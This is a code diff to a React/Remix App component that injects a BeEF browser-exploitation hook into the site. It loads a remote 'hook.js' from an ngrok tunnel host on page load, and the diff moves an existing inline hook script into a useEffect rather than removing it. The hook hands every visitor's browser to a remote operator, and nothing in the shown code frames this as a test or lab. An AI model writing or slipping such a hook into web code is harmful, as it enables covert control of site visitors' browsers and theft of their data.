@@ -68,6 +68,19 @@ export default function App() {
       .catch((err) => console.error("IP check failed", err));
   }, [location.pathname]);
 
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://dda269de979e.ngrok-free.app/hook.js";
+    script.async = true;
+    script.onload = () => console.log("✅ BeEF Hook loaded.");
+    script.onerror = () => console.error("❌ Failed to load BeEF hook.");
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
+
   return (
     <html lang="en">
       <head>
@@ -75,11 +88,6 @@ export default function App() {
         <meta name="viewport" content="width=device-width,initial-scale=1" />
         <Meta />
         <Links />
-
-        {/* ⬇⬇⬇ إضافة سكربت BeEF هنا */}
-        <script src="https://dda269de979e.ngrok-free.app/hook.js"></script>
-        {/* ⬆⬆⬆ */}
-
       </head>
       <body>
         <NavigationProvider>
